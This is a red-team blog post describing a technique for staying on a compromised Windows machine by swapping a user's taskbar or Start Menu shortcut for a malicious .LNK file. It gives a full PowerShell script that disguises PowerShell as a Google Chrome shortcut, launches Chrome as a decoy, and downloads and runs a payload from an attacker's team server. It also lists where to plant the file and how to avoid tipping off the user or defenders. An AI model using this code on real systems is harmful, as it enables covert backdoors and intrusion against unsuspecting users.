---
layout: post
title: Sticky LNKz
date: 2017-08-15
excerpt: "A post about User-Driven persistence using common taskbar and startmenu shortcuts"
tags: [persistence, redteam, cradles, payloads]
comments: false
---
# Intro
As a user in a corporate environment, what is one of the first things you do? After you get some coffee and have a chat with your co-workers about the latest news or some semi-personal event from the night before.. you log in. A good blue team will be looking to make sure when you log in there isn't some type of malware set up with persistence to run before you even hear that catchy windows logon tune. With programs like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns" title="autoruns">**autoruns**</a> and well crafted detection methods from just about every security vendor, it is very likely a redteamer will get caught trying to drop persistence in the known and obvious locations.

## Disclaimer
As I introduce this concept, I apologize if anyone has already explored this method and might think I am blatantly plagurizing their work, I swear it is not my style. 

## User-Drive Persistence
I've seen several different methods of persistence that redteamers (and blackhats) often use to repop a shell on a device that gets shutdown everyday and rebooted the next morning. Senspost's <a href="https://www.twitter.com/_staaldraad">@_staaldraad</a> has a handy tool I was introduced to at Blackhat called <a href="https://github.com/sensepost/ruler">**"Ruler"**</a>. The original concept was once you had credz you could set up an outlook rule to pop a shell whenever needed by sending a triggered email that would delete itself and run a payload via an external webdev share. Genius!
### Subj: "bSpence love his shells"

One of the major limitations to this type of persistence is that you have to rely on some user interaction to generate your trigger and get the shell (ie. the user has to start an application). However, if you pick an application like Outlook or other commonly used standard applications, this can be a nice way to hide your shell popping payloads in plain sight, hidden from the user, and even better, hidden from the blue team.

I recently had an engagement with @SpecterOps in which @bluscreenofjeff and @enigma0x3 introduced to me some tradecraft payload cradles in which they use .LNK and .HTA files as links in their phishing emails to get initial breach shells. I don't like to name drop, but I'd be kind of a jerk without mentioning someone like @SubTee who's been the cradle Jedi master for a year or two now. Anyways, after playing with the cradles and thinking about how my blue team might react something slapped me in the face as I looked at the taskbar.
<figure>
	<a href="https://bspence7337.github.io/bSpenceSecurity/assets/img/taskbar.png"><img src="https://bspence7337.github.io/bSpenceSecurity/assets/img/taskbar.png"></a>
</figure>
Ex: "My Current Taskbar Situation"
{: .mycenter}
## Introducing Sticky LNKz
The epiphany I had was that users often customize their user experience by creating Start Menu and Taskbar shortcuts to execute their favorited applications. The other thing users do is create desktop shortcuts, but I will talk about why the Start Menu and Taskbar are much more covert friendly. These shortcuts get saved on the filesystem as .LNK files since that is essentially what a shortcut is, a link to an executable.

## The Payload
Credit to @enigma0x3 for the original powershell LNK generation, below I've added a few things to retrofit this script for taskbar/startmenu usage. In the example below we will be using Google Chrome as a shortcut. Keep in mind this is post-exploitation work to establish User-Based Persistence.
{% highlight html %}
$LNKName = "C:\Users\<YOUR_USER>\Desktop\Google Chrome.lnk"
$BinaryPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Arguments = "-nop -c `Start-Process chrome.exe; `$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('http://TEAMSERVER:80/URI'))"
$obj = New-Object -COM WScript.Shell
$link = $obj.CreateShortcut($LNKName)
$link.WindowStyle = '7'
$link.TargetPath = $BinaryPath
$link.Arguments = $Arguments
$link.IconLocation = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe, 0";
$link.Save()
{% endhighlight %}
<figure>
	<a href="https://bspence7337.github.io/bSpenceSecurity/assets/img/google_lnkz.png"><img src="https://bspence7337.github.io/bSpenceSecurity/assets/img/google_lnkz.png"></a>
</figure>
Ex: "Google Chrome.lnk"
{: .mycenter}
## Snippet Step-by-Step
The LNKName identifies the save location of the lnk you're generating. You want this to be named exactly like the a taskbar or start menu lnk might look. The BinaryPath establishes powershell.exe as the executable to run instead of the path to chrome.exe
{% highlight html %}
$LNKName = "C:\<DESIRED_LOCATION>\Google Chrome.lnk"
$BinaryPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
{% endhighlight %}
The first part of the command execution here is to start chrome.exe so the user gets an actual chrome popup and doesn't get suspicious that their shortcut didn't start as intended. This can be tricky and works depending on $PATH, but I've noticed putting the full path to the binary usually craps out the script. The second piece is your standard arguments to start a proxy aware shell using a CobaltStrike powershell web drive-by script that you've already hosted on your teamserver.
{% highlight html %}
$Arguments = "-nop -c `Start-Process chrome.exe; `$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('http://TEAMSERVER:80/URI'))"
{% endhighlight %}
The following are required to create the lnk and populate it with the information you've already defined.
{% highlight html %}
$obj = New-Object -COM WScript.Shell
$link = $obj.CreateShortcut($LNKName)
$link.WindowStyle = '7'
$link.TargetPath = $BinaryPath
$link.Arguments = $Arguments
{% endhighlight %}
The IconLocation here is essential to our .lnk remaining covert and not tipping off the user. Notice after the full path the ", 0". This tells the lnk to take the first icon populated in the chrome.exe binary. You can explore this manually by creating shortcuts and changing the icons, but I've pretty much seen 0 as the common choice. 
{% highlight html %}
$link.IconLocation = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe, 0";
$link.Save()
{% endhighlight %}
<figure>
	<a href="https://bspence7337.github.io/bSpenceSecurity/assets/img/icon_path.png"><img src="https://bspence7337.github.io/bSpenceSecurity/assets/img/icon_path.png"></a>
</figure> 
Ex: "Icon's for Chrome.exe"
{: .mycenter}
## Save Location
You really have two options when generating the link. Locally on your lab machine and then uploading it to the below locations on the filesystem, or be bold and upload it directly to the compromised host in the start menu or taskbar locations.
## Task Bar
Windows 10/7
{% highlight html %}
%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
{% endhighlight %}
## Start Menu
Windows 10/7
{% highlight html %}
%AppData%\Microsoft\Windows\Start Menu
{% endhighlight %}
## Why No Desktop Love?
As I indicated before you *could* generate a lnk and put it on the user's desktop, but there is some OPSEC considerations that tip off the user. When hovering over the Desktop shortcut the "Location:<PATH_TO_EXECUTABLE>" is shown on hover. This will get you busted pretty quick if the user is paying attention. The taskbar and startmenu location for some reason do not have the same hovers, so the user will not really be tipped off unless he goes exploring the file locations above.
<figure>
	<a href="https://bspence7337.github.io/bSpenceSecurity/assets/img/location_hover.png"><img src="https://bspence7337.github.io/bSpenceSecurity/assets/img/location_hover.png"></a>
</figure> 
Ex: "Location: powershell"
{: .mycenter} 
## To-Do's
I'd really like to eventually have the time to put this in a Cobaltstrike Aggressor script. I've already started a preliminary script, but I've been a bit stuck on how to approach it. I figured I could use some common shortcut types like Google, IE, Outlook, etc.. but having aggressor tie it to a hosted payload has given me some problems. I know it can be done, but I just haven't had the time to dig into it.
The other nice feature I might do is create a powershell script with user-defined input that will generate the link of your choice, but again, this is on my list of things to do.

## Summary
There are many ways to establish persistence and while the most desired persistence is automated without user intervention sometimes you have to use covert methods like I outlined in this post. I realize it isn't the most sophisticated, but in a pinch it is handy tradecraft like this that might get you out of a bind if defenders start to crack down on known persistence locations. The idea is to think of creative ways to hide your payloads in usable and relevant places so that you can maintain a foothold without getting caught.

If anyone has any comment or feedback regarding this post please look me up on twitter @bSpence7337. Thanks!
